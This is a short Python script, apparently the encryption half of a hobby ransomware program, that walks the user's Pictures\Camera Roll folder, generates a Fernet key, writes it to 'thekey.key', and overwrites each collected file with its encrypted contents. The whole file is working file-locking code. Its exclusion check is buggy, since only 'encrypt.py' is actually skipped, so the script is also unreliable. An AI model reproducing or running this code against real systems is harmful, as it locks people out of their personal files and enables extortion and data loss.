import os
import scandir
from cryptography.fernet import Fernet
folder = os.path.expandvars("%userprofile%")+"/Pictures\Camera Roll" #can be changed to fit your needs

file_list = []
wrong_file = []
i=0
o=0

for paths, dirs, files in scandir.walk(folder):
    for file in files:
        if file.endswith("encrypt.py" or "decrypt.py" or "thekey.key"):
            continue
        else:
            file_list.append(os.path.join(paths, file))


#win11 ghostfilefilter
while i <= len(file_list)-1:
    file_path = file_list[i]
    if file_path.endswith("ini"):
        wrong_file.append(i)
    
    i=i+1
wrong_file.sort(reverse=True)
while o <= len(wrong_file)-1:
    file_path= int(wrong_file[o])
    file_list.remove(file_list[file_path])
    o= o+1
#end win11 ghostfilefilter

key = Fernet.generate_key()
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in file_list:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
